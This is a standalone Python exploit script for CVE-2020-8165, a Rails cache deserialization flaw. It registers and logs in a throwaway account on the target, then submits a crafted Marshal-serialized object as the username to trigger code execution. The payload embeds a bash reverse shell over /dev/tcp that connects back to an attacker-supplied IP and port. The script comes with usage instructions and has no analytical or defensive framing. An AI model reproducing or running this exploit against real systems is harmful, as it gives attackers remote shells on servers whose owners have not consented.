#!/usr/bin/env python3
# CVE-2020-8165 
import requests
import sys
from urllib import parse
import random

class col:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"


def main():

    if len(sys.argv) !=3 :
        print(col.GREEN + "Usage: CVE-2020-8165.py IP IP:PORT"+ col.RESET)
        print(col.LIGHT_BLUE + "Eg: CVE-2020-8165.py 2.3.2.3 10.10.10.10:4444" + col.RESET)
        sys.exit(0)


    def banner():
        banner = r"""
 ____ __ __ _____ -2020-8165
((    \\ // ||==            
 \\__  \V/  ||___           
        """
        
        return banner

    

    def getToken():        
        resp = s.get(parse.urljoin(URL, "signup"))
        if resp.status_code == 200:
            page = resp.text
            token = page.split("\"csrf-token\" content=\"")[1].split("\"")[0]
            return token
        else:
            return None
        return token

    def createUser(token):
        # utf8=â
        # &authenticity_token=
        # &user[username]=asdasd
        # &user[email]=admin@admsin.com
        # &user[password]=admin
        # &commit=Create User
        data = {         
                'utf8':'â',
                'authenticity_token':token,
                'user[username]':USERNAME,
                'user[email]':EMAIL,
                'user[password]':PASSWORD,
                'commit':'Create User'
                }
        s.post(parse.urljoin(URL, "users"), data=data)
    
    def loginUser():
        data = {         
                'utf8':'â',
                'authenticity_token':token,
                'session[email]':EMAIL,
                'session[password]':PASSWORD,
                'commit':'Log in'
                }
        r = s.post(parse.urljoin(URL, "login"), data=data)
        if r.status_code == 200:
            USERID = r.text.split("\">Profile</a>")[0].split("users/")[1]
            return USERID            
        else:
            print("Login Error, Aborting")
            sys.exit(0)
        pass

    def callShell(userid):
        #IP PORT from argv......
        IPP, PORT = sys.argv[2].split(":")
        shell = f"bash -c 'bash -i >& /dev/tcp/{IPP}/{PORT} 0>&1'"
        payload = "\x04\x08o\x3A\x40ActiveSupport\x3A\x3ADeprecation\x3A\x3ADeprecatedInstanceVariableProxy\x09\x3A\x0E\x40instanceo\x3A\x08ERB\x08\x3A\x09\x40srcI\x22{}\x60{}\x60".format(chr(len(shell)+7), shell) +"\x06\x3A\x06ET\x3A\x0E\x40filenameI\x22\x061\x06\x3B\x09T\x3A\x0C\x40linenoi\x06\x3A\x0C\x40method\x3A\x0Bresult\x3A\x09\x40varI\x22\x0C\x40result\x06\x3B\x09T\x3A\x10\x40deprecatorIu\x3A\x1FActiveSupport\x3A\x3ADeprecation\x00\x06\x3B\x09T"
       
        data = {         
                'utf8':'â',
                'authenticity_token':token,
                '_method':'patch',
                'user[username]':payload,
                'commit':'Update User'
                }
        
        id_part = f"users/{userid}/"
        s.post(parse.urljoin(URL, id_part), data=data)
        s.post(parse.urljoin(URL, id_part), data=data)   
        s.get(parse.urljoin(URL, "articles"))

   
    #Start
    try:
        print(col.LIGHT_GREEN + banner() + col.RESET) 
        URL = f"http://{sys.argv[1]}:8080/"

        # User details
        USERNAME = "stev" + str(random.randint(11,999999))
        EMAIL = f"{USERNAME}@gmail.com"
        PASSWORD = "Pas$w8rD!1"
        s = requests.Session()
        print(col.DARK_GRAY + f"Creds:\nUser: {USERNAME}\nEmail: {EMAIL}\nPass: {PASSWORD}\n" + col.RESET)
        print("[+] " +col.GREEN + "Creating account and loggin in" + col.RESET)
        token = getToken()
        if not token:
            print("Can't parse token, try again")
            sys.exit(0)

        createUser(token)
        id = loginUser()
        print("[+] "+ col.GREEN + "Success, calling shell" +col.RESET)
        callShell(id)
    except:
        print(col.YELLOW + "Error Occured, check your settings" + col.RESET)


if __name__ == "__main__":
    main()
